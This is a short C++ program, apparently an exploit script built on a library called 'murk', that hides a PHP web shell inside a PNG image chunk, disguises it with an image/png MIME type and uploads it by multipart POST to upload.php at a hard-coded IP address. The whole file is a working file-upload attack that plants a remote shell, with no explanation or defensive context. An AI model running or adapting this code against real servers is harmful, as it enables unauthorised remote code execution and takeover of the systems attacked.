#include <murk/flows/fs.hpp>
#include <murk/plod/png_chunks.hpp>
#include <murk/plod/php.hpp>

#include <murk/web/http.hpp>
#include <murk/common.hpp>

int main() {
  murk::plod::png_chunks chunks;
  chunks.chunks.emplace_back(murk::plod::png_chunks::chunk{.dat = murk::serialise(murk::plod::php_get_shell_clear())});

  murk::web::multiform_t form;
  murk::web::file_form_elem elem;

  elem.mime = "image/png";
  elem.dat = chunks.render();
  elem.filename = "/";

  form.files.emplace("file_upload", elem);

  std::cout << murk::web::http::post_multipart(murk::web::http::address("http://18.185.97.63/upload.php"s), form, "yeetyeetyeet").body << std::endl;
}
